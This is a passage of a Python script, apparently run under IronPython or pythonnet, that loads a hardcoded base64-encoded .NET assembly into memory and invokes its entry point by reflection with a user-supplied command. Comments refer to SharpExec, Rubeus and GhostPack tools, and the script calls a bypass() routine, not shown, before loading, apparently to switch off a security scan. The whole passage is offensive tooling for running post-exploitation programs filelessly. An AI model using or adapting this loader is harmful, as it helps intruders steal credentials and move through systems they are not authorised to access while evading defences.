    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpExec.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()